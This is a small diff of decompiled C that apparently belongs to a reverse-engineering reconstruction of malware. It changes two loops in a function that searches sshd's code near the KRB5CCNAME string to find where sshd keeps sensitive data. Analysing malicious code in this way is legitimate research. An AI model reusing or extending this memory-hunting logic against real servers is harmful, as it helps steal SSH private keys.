@@ -35,7 +35,7 @@ BOOL sshd_get_sensitive_data_address_via_krb5ccname
   zero_ctx_cursor = &string_scan_ctx;
   for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
     *(u32 *)&zero_ctx_cursor->instruction = 0;
-    zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
+    zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
   }
   *sensitive_data_out = (void *)0x0;
   // AutoDoc: Use the cached string table to jump straight to the block that references `KRB5CCNAME`.
@@ -92,7 +92,7 @@ LAB_0010346b:
               zero_ctx_cursor = &store_scan_ctx;
               for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
                 *(u32 *)&zero_ctx_cursor->instruction = 0;
-                zero_ctx_cursor = (dasm_ctx_t *)((long)zero_ctx_cursor + (ulong)zero_seed * -8 + 4);
+                zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
               }
               // AutoDoc: After spotting the getenv result, walk the next few instructions looking for stores into `.bss`.
               store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size;
